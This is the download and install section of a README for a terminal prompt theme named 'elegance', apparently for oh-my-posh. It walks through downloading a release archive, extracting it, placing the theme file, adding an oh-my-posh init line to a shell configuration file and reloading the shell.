## 📥 Download & Install

To get started with elegance, you’ll need to visit this page to download: [elegance Releases Page](https://github.com/gillieswimming233/elegance/releases).

### Step 1: Choose Your Version

On the releases page, you'll see a list of versions available for download. Look for the latest version. This ensures you have the most recent features and fixes.

### Step 2: Download the Theme

Click on the version link that interests you. The file may have a `.zip` or `.tar.gz` extension. This type of file contains the theme and any necessary elements to set it up.

### Step 3: Extract the Files

After the download finishes, locate the file in your downloads folder. Right-click it and select "Extract All" or "Extract Here." This will create a new folder with the same name as the downloaded file. Open this folder to find the theme files.

### Step 4: Move Files to the Right Location

Move the extracted theme files to the directory that your terminal uses for themes. This is usually found in a specific path like `~/.oh-my-posh/themes` for Bash or Zsh. If you need help locating this, feel free to reach out to us or check the documentation for your terminal.

### Step 5: Configure Your Terminal

To use the elegance theme, you may need to configure your terminal to recognize it. Open your terminal and edit your configuration file. Depending on your terminal, this will typically be:

- `~/.bashrc` for Bash
- `~/.zshrc` for Zsh
- `profile.ps1` for PowerShell

Add or update the following line to set the theme:

```bash
oh-my-posh init bash --config ~/path/to/elegance.json
```

Make sure to replace `~/path/to/elegance.json` with the actual path to the theme file you moved earlier.

### Step 6: Refresh Your Terminal

After saving your configuration file, you’ll need to refresh your terminal. You can do this by closing and reopening the terminal or by executing the command below:

```bash
source ~/.bashrc
```

Replace `~/.bashrc` with the path to your configuration file if you use a different terminal.
